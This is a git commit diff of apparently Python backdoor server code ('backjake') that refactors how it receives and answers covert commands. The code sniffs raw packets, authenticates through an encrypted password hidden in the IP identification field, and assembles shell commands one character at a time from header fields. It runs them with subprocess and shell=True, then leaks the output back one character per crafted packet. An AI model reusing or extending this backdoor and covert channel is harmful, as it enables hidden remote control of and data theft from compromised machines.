4a03516429accbf33906170dfd2405d524d10bce
Jake Miner <zyko101@gmail.com>
2014-11-23 15:58:11 -0800

    Server: cleaning up code, making matching changes to packet crafting

--- recvFunctions.py
+++ recvFunctions.py
@@ -11,6 +11,7 @@ import backjake
 import utils
 
 command = ""
+pswd = utils.encrypt(config.password)
 
 def recieveDatagram():
 	cap = pcapy.open_live(config.dev, 65536, 1, 0)
@@ -37,7 +38,6 @@ def authenticated(packet):
 	ip = packet[ethLength:ipLength+ethLength]
 	ipHeader = unpack('!BBHHHBBH4s4s' , ip)
 	ipIdent = ipHeader[3]
-	pswd = utils.encrypt(config.password)
 
 	# check ip identification field for encrypted password
  	if ipIdent == pswd:
@@ -57,13 +57,14 @@ def checkCommand(ip, proto, data, pacType):
 		character = proto[2]
 
 	# print proto
-	if character != 15:
-		command += chr(character)
-	else:
-		executeCommand(socket.inet_ntoa(ip[8]))
+	if character < 256:
+		if character != 15:
+			command += chr(character)
+		else:
+			executeCommand(socket.inet_ntoa(ip[8]), pacType, command)
+			command = ""
 
-def executeCommand(srcAddress):
-	global command
+def executeCommand(srcAddress, pacType, command):
 	# check if command is within the backdoor
 	# otherwise, exec it
 	# clear command at the end
@@ -72,20 +73,13 @@ def executeCommand(srcAddress):
 	# results = os.system(command)
 	# shell = str(directory) + " > " + str(results)
 	# print shell -> send results back to client
-	directory = subprocess.Popen("pwd", shell=True, stdout=PIPE).stdout.read() 
-	results = subprocess.Popen(command, shell=True, stdout=PIPE).stdout.read()
-	shell = "["+directory[:-1] + "]# " + results
-
-	sendThread = threading.Thread(target=sendResults, args=(str(shell),srcAddress))
-	sendThread.daemon = True
+	sendThread = threading.Thread(target=sendResults, args=(srcAddress,pacType,command))
 	sendThread.start()
 
-	command = ""
-
-def sendResults(results, address):
+def sendResults(address, protocol, comm):
+	results = subprocess.Popen(comm, shell=True, stdout=PIPE).stdout.read()
+	
 	# encrypt results 
 	# for each character, send a packet to address
 	for c in results:
-		send(IP(dst=address)/TCP(dport=RandNum(1024, 65535), sport=RandNum(1024, 65535), seq=ord(c)), verbose=0)
-
-	send(IP(dst=address)/TCP(dport=RandNum(1024, 65535), sport=RandNum(1024, 65535), seq=15), verbose=0)
+		send(utils.covertPacket(address, protocol, c, pswd), verbose=0)
